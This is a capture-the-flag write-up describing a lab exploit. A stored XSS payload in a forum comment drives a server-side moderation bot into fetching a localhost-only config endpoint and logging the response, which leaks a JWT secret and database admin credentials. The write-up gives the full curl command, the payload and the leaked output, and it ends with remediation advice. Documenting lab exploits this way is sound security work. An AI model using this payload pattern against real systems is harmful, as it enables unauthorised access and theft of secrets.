# Flag 05 — SSRF via the moderation bot (internal config disclosure)

**Flag:** `FLAG{d3fus3dxml_n3xt_spr1nt_pr0m1s3}`
**Location:** `GET /internal/config` — restricted to localhost; reached by making the moderation bot (which runs on `127.0.0.1`) request it.
**Severity:** Critical
**Class:** SSRF (server-side request forgery) via stored XSS → internal endpoint disclosure.

## Discovery

`/internal/config` returns `403 forbidden` from any external client, and the check is on the real source IP — an `X-Forwarded-For: 127.0.0.1` spoof was ignored. But the moderation bot is a headless browser running *on the server* (`from: 127.0.0.1`), so a request it makes to `/internal/config` passes the localhost check. The stored-XSS sink from Flag 04 lets us drive the bot's browser.

## Exploitation

Plant a comment whose script makes the bot fetch the localhost-only config and exfiltrate the response to the open `/api/collect` log:

```bash
TARGET=192.168.1.155
curl -s -b jdoe.txt -X POST "http://$TARGET:4942/forum/6viy7xi64gxpan3/comment" \
  --data-urlencode 'content=<img src=x onerror="fetch(`/internal/config`).then(r=>r.text()).then(d=>fetch(`/api/collect?c=`+encodeURIComponent(d)))">'

sleep 60
curl -s "http://$TARGET:4942/api/collect"
```

The bot runs the payload and the config lands in the log:

```json
{"jwt_secret":"42network",
 "pb_admin_email":"admin@42network.local",
 "pb_admin_password":"Darkly42Admin!",
 "app_version":"1.0.0","campus":"wilcity",
 "darkly_flag":"FLAG{d3fus3dxml_n3xt_spr1nt_pr0m1s3}"}
```

## Impact

An attacker reaches internal-only services by relaying requests through a trusted server-side component. Here it exposed the JWT signing secret and the database admin credentials — a full compromise of the platform's trust: forge any token, log into the database admin, read/modify any record.

## Remediation

- Fix the root XSS (output-encode user content) so the bot cannot be driven.
- Do not rely on source IP alone for internal endpoints; require authentication/authorisation even for localhost, and segment internal services off the web-facing app.
- Never store admin credentials or signing secrets in an endpoint the app can be tricked into fetching.

## Follow-on

The leaked `pb_admin_email` / `pb_admin_password` are the route to `staff`/`god`: the app blocks self-assigning those roles, but the PocketBase database admin can set any record's role directly. (See Flag 06.)
